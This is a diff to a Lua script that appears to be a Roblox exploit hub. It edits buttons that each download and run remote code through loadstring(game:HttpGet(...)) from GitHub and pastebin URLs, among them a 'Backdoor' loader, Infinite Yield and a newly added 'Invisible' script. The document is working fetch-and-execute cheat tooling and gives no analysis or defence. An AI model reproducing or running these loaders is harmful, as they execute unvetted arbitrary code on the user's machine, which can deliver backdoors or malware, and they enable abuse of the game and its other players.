@@ -49,7 +49,6 @@ createButton("Backdoor", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
 end)
 
--- Replacing "LALOL" script
 createButton("LALOL", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/turhan2112/Allinone/refs/heads/main/Lalol%20hub%20fixed", true))()
 end)
@@ -62,6 +61,15 @@ createButton("EdgelY", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
 end)
 
+createButton("Sound Player", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BingusWR/dwd/refs/heads/main/Yesmoney", true))()
+end)
+
+-- Add "Invisible" Button
+createButton("Invisible", function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
+end)
+
 -- Add the "Discord" button
 createButton("Discord", function()
     setclipboard("https://discord.gg/CEhHrnCd6M") -- Copies the link to the clipboard
@@ -70,11 +78,6 @@ createButton("Discord", function()
         Text = "Discord link has been copied!";
         Duration = 3;
     })
-end)
-
--- Add "Sound Player" button
-createButton("Sound Player", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/BingusWR/dwd/refs/heads/main/Yesmoney", true))()
 end)
 
 -- On/Off Toggle Button
